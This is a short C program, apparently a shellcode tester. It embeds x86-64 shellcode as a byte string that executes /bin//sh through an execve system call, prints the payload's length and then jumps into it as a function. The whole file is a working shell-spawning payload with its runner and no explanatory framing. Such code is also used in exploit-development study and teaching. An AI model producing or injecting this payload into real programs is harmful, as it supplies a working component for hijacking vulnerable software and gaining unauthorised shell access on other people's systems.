#include <stdio.h>
#include <string.h>

unsigned char code[] = \
"\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x48\x0f\xaf\xc2\x04\x3b\x0f\x05";

int main()
{
    printf("Shellcode Length:  %d\n", strlen(code));

    int (*ret)() = (int(*)())code;

    ret();
}
